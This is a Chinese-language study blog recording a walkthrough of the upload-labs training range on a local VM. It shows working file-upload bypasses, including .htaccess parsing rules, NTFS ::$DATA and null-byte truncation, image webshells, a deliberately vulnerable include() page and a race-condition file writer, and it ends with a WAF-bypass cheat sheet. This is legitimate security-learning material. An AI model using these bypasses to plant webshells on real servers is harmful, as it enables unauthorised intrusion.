---
title: upload labs 练习
date: 2019-02-13 08:27:43
updated: 
tags: [文件上传]
description:
keywords:
comments:
image:
categories:
  - 笔记
---
本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.
末尾也会持续补充关于upload的知识积累
<!--more-->
# 没有解决的pass

+ ~~[pass3](#pass3) 还有burp截包没有返回的问题.~~ //刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题.
+ ~~[pass5](#less5) 同pass3~~ //同上,解决
+ [pass11](#less11) url截断上传失败
+ [pass12](#pass12) hex截断上传失败


# upload漏洞粗略了解
## upload类型
![upload类型.png](https://e1sewhere.github.io/images/upload类型.png)

## 判断upload
![判断upload.png](https://e1sewhere.github.io/images/判断upload.png)

# 总结

**判断操作系统**
> 我们使用构造后缀的方法时,与操作系统息息相关,例如添加空格,添加点,添加`::$DATA`都是windows系统的特性,要多注意服务器的版本,与服务所在的操作系统.

# 参考过的比较好的writup

1. https://github.com/LandGrey/upload-labs-writeup
2. https://zhuanlan.zhihu.com/p/52099683
3. https://fuping.site/2018/06/04/upload-labs-writeup/

没有看很多,主要看他们的思路.

# WritUp




## pass 01 客户端后缀检查
上传jpg文件成功,上传php文件失败,提示后缀问题.白名单检测.由于弹出错误很快,我们猜测是客户端校验
直接单击了'查看提示',知道了这个pass是本地js检查文件,可以本地修改.
### 方法一 firefox 开发者工具直接修改 待查?
f12->查看器
找到响应js部分(直接搜索jpg)

```
var allow_ext = ".jpg|.png|.gif";
```

直接添加,一个`|.php`.
理论上就可以上传了.但是上传失败,提示依旧

### 方法二 禁用js
直接禁用浏览器js功能,安装firefox插件`noscript`,禁用浏览器js.重试上传过程,成功

### 方法三 burp改包
把一句话木马后缀改为`.jpg`
burp代理好,点击上传.把劫到的包发送到,burp的repeater.

```
POST /upload-labs/Pass-01/index.php HTTP/1.1
Host: 192.168.96.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://192.168.96.128/upload-labs/Pass-01/index.php
Content-Type: multipart/form-data; boundary=---------------------------7020711924050
Content-Length: 297
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------7020711924050
Content-Disposition: form-data; name="upload_file"; filename="m.jpg"  //这里修改为`m.php`
Content-Type: image/jpeg
```
查看头,把`filename`改为`php`后缀.点击go,右边查看返回页面源码

```
<img src="../upload/m.php" width="250px" /> 
```
在一个`img`标签中找到我们上传的文件路径,看到文件已经变为`php`文件.

## pass2 服务端mime检查
本pass在服务端对数据包的MIME进行检查.

直接像pass1一样使用burpsuit修改.

```
Content-Disposition: form-data; name="upload_file"; filename="2.php" //这里直接上传php文件即可不要修改
Content-Type: image/png  //这里原来不是img类型,我们修改为img类型
```
修改后,go,查看成功了

## pass3 服务端黑名单 <span id="pass3">???</span>
上传提示不允许php等文件上传,查看提示,应该是服务端黑名单
~~本例按照网上的writup无法复现,暂时搁置~~   //已经问题随着pass2的解决同时解决了,参考pass2
//关于,使用burp抓包后,抓不到我们请求的包抓,burp代理firefox,firefox会向服务器发送包,所以浏览器请求的时候发了两个包,一个是像火狐服务器,一个是向网站.我们需要在burp的proxy选项卡的子选项卡intercept,里面.点,`drop`丢弃这个火狐的包,或者`fordard`放行这个包,当然点`drop`最好


### 方法一 直接绕过
文件直接修改
我们修改php后缀,服务器只禁止了`.php`也许没有禁止`phtml,php3`等可以解析的php后缀.
修改为`php3`上传成功.尝试使用菜刀连接连接失败.
直接看服务器的上传路径原来是文件被重命名了.
查看网页上提供的源码提示有如下代码,限制大小写,去末尾点,去末尾`::data`,去末尾空.这三种构造后缀绕过.

```
  $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空
```
本方法失败,我们尝试用新的名称菜刀连接,成功了.
~~但是现实我们很难获得改变后的名称.~~
哈哈,昨天傻了,还'很难获得',直接使用burp抓包看返回的图片路径,就知道的我们长传的文件的路径和名称,或者直接用浏览器看源码也可以知道,昨天忘记了的原因可能是burp不知道为什么一直抓不到包.刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题



### 方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）
#### 原理
.htaccess是apache服务器中的一个配置文件,不是上传的文件的黑名单之内 ,所以.htaccess文件是可以上传成功
上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析

#### 上传
打开记事本，将如下代码写入文本中：

```
AddType  application/x-httpd-php    .jpg
```
然后点击文件选中另存为，编写文件名为`.htaccess`(win创建点开头的文件可以用命令行,或者重命名的时候在后面多加一个点如`.htaccess.`否则会报错)，选择保存类型为所有文件
`.htaccess`文件里的代码的含义 是 将上传的文件后缀名为`.jpg`格式的文件以` php`格式来解析文件。   
将`.htaccess`文件进行上传,上传成功。
按照原理这里我们直接上传`.jpg`后缀的一句话就可以了.但是我们直接查看上传路径,我们的规则文件也被重命名了.所以本例子中无法成功.

*为了测试新学会的这个法二,我们手动修改好两个文件,试一试能否连接*

直接往上传文件夹复制两个文件`2.jpg` `.htaccess`
使用菜刀连接,连接成功了`2.jpg`如我们期望被服务器作为php文件解析了.

## pass4 服务端黑名单检查
页面直接重新加载,猜测是服务端验证.
我们修改后缀为`.php3`依然报错
查看提示,这是黑名单过滤,过滤了绝大部分可执行文件后缀.

### 方法一
直接在`.php`后再添加一个服务器无法解析的后缀,当无法解析的时候服务器会尝试解析前一个后缀.
我们将文件名称改为`4.php.7z`,上传成功了.
直接使用菜刀连接.成功了,文件被当作`php`文件解析了.

### 方法二
继续使用上一个题目学会的上传解析规则文件的方法.
我们创建文本文档写入以下内容

```
AddType  application/x-httpd-php    .jpg
```
然后将文件改名为`.htaccess`并上传
上传成功了
然后上传一个`4.jpg`的一句话,成功
使用菜刀连接,成功,文件被服务器当作php执行了.
<span id="less5"></span>

## pass5 
依然判断是服务器检查
我们先上传`.php3,.phptml`都是失败了.
再上传`.php.7z`成功了 由于上面的都可以通过添加后缀的方法绕过,猜测是我的靶场环境有点问题.后面的pass将会禁止这个方法.
我们直接查看提示,发现禁用了常见的后缀,`.htaccess`也被禁止了.
直接查看源代码
发现包含部分大小写,`php2`这样类似的方法都被禁止了
但是并没有完全禁止大小写.我们尝试一个没有被禁用的大小写.成功了,且被解析为`php`
我们要用一个新学会的方法.

### 双写绕过
我们再次查看源码,过滤了末尾的`.`末尾的空格和末尾的`::%DATA`
这三种字加到文件后缀的末尾都会被windows系统自动删除.而服务器处理的时候是会保留的并将其一通视为后缀.最后保存到本地windows中就被删除了.
一下是网上搜到的
> php+win时.`文件名+::$DATA`会把data之后的当文件流处理,最后保存的时候只保留`::$DATA`之前的文件名



查看源码消除`::DATA`的方法,是直接删除,所以可以使用双写的方法绕过
我们将后缀构造成这样的形式`.php::%::%DATADATA`
在通過服務器的時候会被服务器把中间的`::%DATA`删除,然后保存到windows中就是`.php::%DATA`这样的形式,由于windows的特性`::%DATA`会被删除(还是忽略?)最后保存到文件系统中就是我们想要的`.php`.
尝试菜刀连接成功了.
注意这里我们上传的文件除后缀部分依然被重命名了.需要查看burp的返回页面找到文件路径的名称.


## pass6
### 加空绕过
为了节约时间直接查看源码,过滤方法中将后缀全部替换为小写,删除末尾的点,去除末尾`::$DATA`.没有对末尾空格处理.
我们注意到这里依然将`::$DATA`直接去除,所以依然可以使用双写绕过.
这里我们不再重复,使用加空格绕过
构造这样的后缀`.php `
上传成功.
查看burp返回页面

```
<img src="../upload/201902151027474533.php " width="250px" />
```
使用菜刀访问我们的文件,成功

## pass7 后缀加点绕过
节约时间,直接查看源码.

```
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```
可以看到没有对末尾的点处理,而且依然可以使用`::%DATA`双写
我们使用点号的漏洞,构造这样的后缀`.php.`
查看burp的返回页面

```
<img src="../upload/5.php." width="250px" />            </div>
```
成功了,哈哈最神奇的是这次居然没有重命名了
我们用菜刀连接成功了.

## pass8 `::$DATA`绕过
直接查看源码

```
 $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
```
没有过滤`::$DATA`这次连双写都不用了,直接添加这个尾缀.
这里就不再操作

## pass9 
直接看源码

```
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```
这次6,7,8pass用的方法都不能用了.
我们试一下最开始使用过的方法利用php解析漏洞构造这样的尾缀`.php.7z`

```
<img src="../upload/5.php.7z" width="250px" />
```
成功了

但是我需要用其他的方法,于是搜索writup
有这样一种方法

我们查看方法调用,先去除了末尾的点,有去除了末尾的空.
那么构造一个这样的后缀试一下`.php. .`
按照我们的想法,服务处理后就变成了`.php.`
这就是我们想要的后缀.
使用burp返回页面

```
 <img src="../upload/9.php. " width="250px" />            </div>
```
成功了.

## pass10 
直接查看源码

```
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
```
第二个方法把`$deny_ext`这个数组里包含的所有后缀都替换为空,我们先试一下`.phP`
上传成功了但是查看返回

```
<img src="../upload/5." width="250px" />    
```
`phP`被替换了,这个替换是忽略大小写的.

但由于是直接替换为空,我们就可以使用双写了.
### 后缀双写
直接构造`.phphpp`
查看burp返回

```
 <img src="../upload/10.hpp" width="250px" />
```
???,emmm这返回的啥.
啊,我构造的有点蠢,虽然是把php插在另一个php里但是最开头构成了php,所以中间的php被拆了.
重新构造`.pphphp`,查看返回

```
<img src="../upload/10.php" width="250px" />
```
恩,这样就没问题了.

<span id="less11"> </span>
## pass11 
查看源码

```
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```
白名单,只允许图片后缀.但是文件上传路径是通过`get`方法取得的,猜测可以在url中传入我们构造的路径,然后将后面的代码注释掉.
然而我不知道怎么注释,搜索网上的writeup,可以使用`%00`截断,就把后面的字符串截断了.
使用`%00`截断必须满足两个条件

+ php版本小于`5.3.4`
+ php的`magic_quotes_gpc`为`OFF`状态 //在php.ini中修改

这两个条件我的服务端都满足.
所以我使用这个方法,在burp中自定义上传路径然后加上阶段符号

```
POST /upload-labs/Pass-11/index.php?save_path=../upload/haha/11.php%00 HTTP/1.1  //这里使用了%00截断
Host: 192.168.96.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://192.168.96.128/upload-labs/Pass-11/index.php?save_path=../upload/
Content-Type: multipart/form-data; boundary=---------------------------14066184711055
Content-Length: 324
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------14066184711055
Content-Disposition: form-data; name="upload_file"; filename="11.jpg"
Content-Type: image/jpeg
```

返回提示上传出错.检查了下配置和我的playload应该没有问题.
只能查看下源码问题在哪里了.
先查一下不认识的函数:
> `strrpos(被查找的字符串,要查找的字符)`,这个函数查找某个字符在字符串中最后一次出现的位置.大小写敏感
> `$_FILES[]['name']`获得上传文件的原名称.如果后面的括号里是`type`就是获得文件类型,`tmp_name`获得文件被上传后服务器存储的临时文件名,一般是默认.`size`已上传文件大小.`error`和文件上传错误相关的代码.
> `move_uploaded_file(string $filemane,String $destination)`将指定文件(必须是合法的即通过post,get上传的文件)移动到由`destination`指定的文件


```
  $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
```
这个语句的意思就是截取上传文件的原名称的`.`后面的字符.也就是后缀.`$file_ext`这个变量保存了文件后缀

```
if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(6($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
```
这一段意思是,如果文件后缀在我们的列表内就继续,否则提示不允许,如果继续,取得文件临时名,再通过`sava_path`构造一个`img_path`用来存放文件.
然后判断移动临时文件到我们构造的路径是否成功,失败就报错.
所以我们的移动失败了.

<span id="pass12"> </span>
## pass12
通过我不知道的某种方法,我们判断了这是截断上传,而且是通过`post`方法提交参数的截断上传.
由于post方法不会自动将`%00`作为截断符,我们需要直接在hex 中添加截断符
实际操作方法很简单
将burp拦截的包发送到repeater,修改raw中的

```
Content-Disposition: form-data; name="save_path"

../upload/
```
在路径后添加我们需要的内容

```
../upload/12.php
```
然后再最后再添加一个空格,作为之后修改hex值的标记
我们切换到hex选项卡,找到路径的那一行
之前我们在路径末尾添加了空格,空格的hex值为`20`,我们找到这一行的`20`将他修改为`00`就是hex中截断符.然后回车保存.
发包测试.失败了,同上一条一样提示上传失败.
暂时跳过,所有步骤和网上的好几个write up相同,应该不是操作原因.

## pass13
要求为上传图片马到服务器并使用文件包含漏洞运行图片中的代码,之前学过.但是不知道怎么操作.

### 制作图片马
在win中,首先准备一个恶意代码文件假设命名为`m.php`

```
<?php phpinfo();?>  //这次我们为了方便不用一句话了,直接用代码查看服务器信息
```

然后准备一张图片假设名称为`pic.jpg`
放在同一目录下,使用cmd进入这个目录
输入命令`copy pic.jpg/b + m.php/a picm.jpg`

> 命令中`/b`表明二进制文件 `/a`表明ascii文本文件
> 值得一提的是如果把两个文件调换位置(两个参数跟着)`copy m.php/a + pic.jpg/b picm.jpg`,生成的文件图片就乱码了,猜测是文本加在了图片的前面.

直接将这个制作好的图片马`picm.jpg`上传到靶机.
上传成功了,使用burp查看,被重命名了.

### 制作文件包含入口
虽然也可以使用`.htaccess`但是要求使用文件包含
由于没有发现pass13页面,本身有文件包含入口.所以我自己构造了一个包含文件包含漏洞的php页面.

```
<?php
$file=$_GET['page'];  //通过url获取参数赋值给变量
include($file);  // 传入用户变量给`include`函数,产生漏洞.
?>
```

手动传入服务器,访问,在url中传入我们的参数,也就是我们上传的图片码

```
http://192.168.96.128/upload-labs/upload/include.php?page=1520190215165135.jpg
```

这样我们图片中包含的php代码就被服务器解析了.
我们看到页面上显示了当前php服务器信息.

*注意:当我们使用远程文件包含的时候,如果包含的能直接运行的代码文件,如.php,那么这个代码就会在文件所在机器执行,如果包含的是txt,jpg这样的含有代码的服务器不能直接解析的文件,就会包含到我们的`include`所在的代码中合并执行,也就是在使用包含函数的服务段执行*

## pass14
本pass14,通过阅读源码得知,使用`getimagesize()`函数判断文件类型,粗略搜索了这个函数会判断文件流的头,来判断是否为图片文件

我们测试一下这个函数,来粗略的理解它.
首先我们使用十六进制编辑器,推荐使用np++

首先我们构造一个php语句

```
<?php phpinfo(); ?>
```

它的16进制值是

```
3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E
```

我们在最前面添加16进制的png头,将其构造为假的png文件

```
8950 4E47 0D0A 1A0A 3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E
```

最后保存成 `.png` 后缀的文件

>这里注意,十六进制编辑器,我先使用的notepad++的插件.失败了,特别是无法使用64位的插件
>然后使用ue的十六进制编辑发现无法直接将16进制的字符插入,会被自动写入字符串那边
>最后我使用了`HxD`这个软件,成功修改了.

然后上传成功.
我们直接使用pass14页面的文件包含漏洞,打开文件包含入口页面.页面直接展示了源码.
发现使用file字符可以通过get注入到include函数中.

```
http://192.168.96.128/upload-labs/include.php?file=./upload/5320190221140730.png
```
输入payload,成功了

这里我们使用pass的方法.cmd的`copy`命令拼接成的文件就含有图片文件的头信息,使用十六进制编辑器查看是含有头文件的,所以同pass13一样可以绕过,这里就不再重复.

## pass15
pass15查看源码使用了`exif_imagetype()`函数.上传时发生问题,页面无响应
查看别人的writeup发现是没有开启服务器的`php_exif`模块.开启后上传上一个pass制作的图片码,成功了,没有继续去搜寻这个模块的作用,推测也是通过检测头的方式.

## pass16
我们查看页面提示,知道了本例会比对文件后缀与文件结构是否相同,而且会重新渲染图片.这样我们即使绕过了比对,最后的图片会被重新渲染,插入的代码很可能就被修改了.
使用的`imagecreatefromgif`函数渲染.
由于需要些脚本比上传后的图片没有被修改的部分,所以我没有复现,只是了解了原理.
这里放出一个链接,似乎是漏洞的发现者的文章:http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/

如果有时间将会专门编写脚本重新测试这个pass

## pass17
这题的本意的考察`条件竞争`,什么意思呢.我也不知道.
在搜索writeup的时候我发现了一个`win+php`时可以使用的方法.

### 方法一
方法可以在:https://paper.seebug.org/92/#0x05-iisphp 的`0x05`标题下找到
建议先观看

科普： 在php+window+iis环境下:

> 双引号(“>”) <==> 点号(“.”)’;
> 
> 大于符号(“>”) <==> 问号(“?”)’;
> 
> 小于符号(“<“) <==> 星号(“*”)’;

其他原理不再说明直接给出操作过程.
首先我们先利用特殊办法生成一个php文件，然后再利用这个特性将文件覆盖..

我们上传一个写有一句话的php文件使用burp抓包.我们先修改文件名称 `17.php:.jpg`

```
Content-Disposition: form-data; name="upload_file"; filename="17.php:.jpg"
```
*tips:冒号可以截断,冒号截断产生的文件是空白的*
页面提示图片不符合要求,我们查看服务器已经生成了一个`17.php`的没有任何内容的文件

然后继续修改上传名称`17.<<<`

```
Content-Disposition: form-data; name="upload_file"; filename="17.<<<"
```

页面提示上传不符合要求,我们查看服务器,刚才的`17.php`文件已经有代码内容了.

### 方法二 条件竞争

#### 演示
我们先不看源码演示过程,粗略的猜想下,这个就是利用代码设计者没有考虑到多线程并发造成的某些延迟问题.
粗略的理解代码,这个pass先将文件上传然后比对,如果不符合条件再删除.所以要使用多线程造成程序堵塞,在这个时间访问页面.由于只能在我们不断写入的时候访问,很快就会被删除,我们要使用访问的这个文件去创建一个含有代码的文件.

首先编写一个 `100.php`

```
<?php fputs(fopen("info.php", "w"), "<?php phpinfo(); ?>"); ?>  //会在当前目录写入一个`info.php`文件,内容是"<?php phpinfo(); ?>"
```
由于现在还不会编写脚本.我使用burp的 intruder功能
使用number类型的paylaod,变量直接设置在内容里

![positions](https://e1sewhere.github.io/images/tjjz.png)

![payload](https://e1sewhere.github.io/images/jjpl.png)

然后线程设置大一点*线程的设置在intruder>options>request engin>number of threads*

然后开始执行,执行期间我们访问 这个`100.php`(可以先上传一个正常的图片获得),多刷新几次,发现页面显示235,也就是上传含有235的payload的时候这个页面执行成功了,说明当前目录下已经有了一个`info.php`文件了.我们尝试访问,显示了php版本页面,成功了.

#### 分析
查看源码

```
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){  //不做判断直接上传了文件
        if(in_array($file_ext,$ext_arr)){  //判断后缀
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);  //不符合,就删除文件
        }
    }else{
        $msg = '上传出错！';
    }
}

```

补充函数:
> 定义和用法
> unlink() 函数删除文件。
> 若成功，则返回 true，失败则返回 false。
> 语法
> unlink(filename,context)

从我的简单注释发现,和之前的的描述一样.没有什么好分析的了.直接上传,判断不合法就删除.文件在多线程上传的时候就会有一个滞留时间,然后访问,执行代码.

## pass18
条件竞争
使用重命名上传,我还没有看源码 ,之后有时间查看

直接步骤
由于上传的文件会被重命名.利用上传重命名竞争+Apache解析漏洞
上传名字为`18.php.7Z`的文件,会被重命名为`date().7z`
快速重复提交该数据包，会提示文件已经被上传，但没有被重命名
使用burp
和上面的步骤一样,只是这次可以直接上传webshell了
尝试了几次一直没有在upload目录下找到上传的文件,发现是作者的代码有误构造的保存路径的`upload`后面没有加`/`,这个`upload`变成了文件名的一部分.

![](https://e1sewhere.github.io/images/522.png)

直到返回一个不同的页面.我们去文件路径下看.
![](https://e1sewhere.github.io/images/553.png)

有`xx.php.7z`这样的文件了.这里就可以使用apache解析漏洞直接访问.

```
http://999.999.999.999/upload-labs/100.php.7z
```
就执行代码了.

# upload bypass

## waf检测范围
请求的url
Boundary边界
MIME类型
文件扩展名
文件内容

测试时的准备工作：
什么么语言？什么容器？什么系统？都什么版本？
上传文件都可以上传什么格式的文件？还是允许上传任意类型？
上传的文件会不会被重命名或者二次渲染？

## 容器特性

### apache1.x 2.x文件后缀解析漏洞
Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止

### ISS6.0解析缺陷
目录名包含 .asp 、 .asa 、 .cer 的话，则该目录下的所有文件都将按照asp解析
例如`c:\wwwroot\cer.cer\haha.jpg`
这个文件就会被解析为`.asp`文件

文件名中如果包含 .asp; 、 .asa; 、 .cer; 则优先使用asp解析。
例如： `asa.asa;asa.jpg`
会被解析为`.asp`

### Nginx解析漏洞
Nginx 0.5.*
Nginx 0.6.*
Nginx 0.7 <= 0.7.65

#### Nginx 0.8 <= 0.8.37
以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以
shell.jpg%00.php进行请求。

#### Nginx 0.8.41 – 1.5.6：
以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以
shell.jpg%20%00.php进行请求。

### PHP CGI解析漏洞
IIS 7.0/7.5
Nginx < 0.8.3

以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展
名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析

### 多个Content-Disposition

在IIS的环境下，上传文件时如果存在`多个Content-Disposition`的话，IIS会取第一个
Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话将会被绕过。

```
content-dispositon:form-data; name="file"; filename="shell.php"
content-dispositon:form-data; name="file"; filename="shell.jpg"
```

### 结合.htaccess
这个方法通常用于绕过waf黑名单的，配置该目录下所有文件都将其使用php来解析

## 系统特性
### windows特殊字符
当我们上传一个文件的filename为

```
shell.php{%80-%99}
```
时(这个%80是哈希要用hex编辑)：
waf可能识别`%80-%99`,但是window会识别为空格,而后缀名的空格会被windows忽略.

### exee扩展名
上传.exe文件通常会被waf拦截，如果使用各种特性无用的话，那么可以把扩展名改
为.exee再上传。

### NTFS ADS特性
ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求
正文的 filename 匹配不当的话可能会导致绕过

| 上传文件名 | 服务器表面现象 | 生成文件内容 |
| :------------- | :--------------------- | :---------------------------- |
| test.php:a.jpg | 生成test.php | 空 |
| test.php::$INDEX_ALLOCATION | 生成test.php文件夹 |  |
| test.php::$DATA.jpg | 生成test.php | 原内容 |

Windows在创建文件时，在文件名末尾不管加多少点(空格也是)都会自动去除，那么上传时filename
可以这么写 shell.php...... 也可以这么写 shell.php::$DATA.......

## 数据过长导致的绕过
waf如果对`Content-Disposition`长度处理的不够好的话可能会导致绕过

基于构造长文件名:
如果web程序会将filename除le 扩展名的那段重命名的话，那么还可以构造更多的点、符号绕过重命名.

```
filname="shell.............................................................................................................................................................................................................................................................asp"
```
特殊的长文件名：
文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性测试：

```
shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg

```

## wafbypass_upload一些总结绕过

在这里放上个人之前总结的30个上传绕过姿势：

```
1. filename在content-type下面
2. .asp{80-90}
3. NTFS ADS
4. .asp...
5. boundary不一致
6. iis6分号截断asp.asp;asp.jpg
7. apache解析漏洞php.php.ddd
8. boundary和content-disposition中间插入换行
9. hello.php:a.jpg然后hello.<<<
10. filename=php.php
11. filename="a.txt";filename="a.php"
12. name=\n"file";filename="a.php"
13. content-disposition:\n
14. .htaccess文件
15. a.jpg.\nphp
16. 去掉content-disposition的form-data字段
17. php<5.3 单双引号截断特性
18. 删掉content-disposition: form-data;
19. content-disposition\00:
20. {char}+content-disposition
21. head头的content-type: tab
22. head头的content-type: multipart/form-DATA
23. filename后缀改为大写
24. head头的Content-Type: multipart/form-data;\n
25. .asp空格
26. .asp0x00.jpg截断
27. 双boundary
28. file\nname="php.php"
29. head头content-type空格:
30. form-data字段与name字段交换位置
```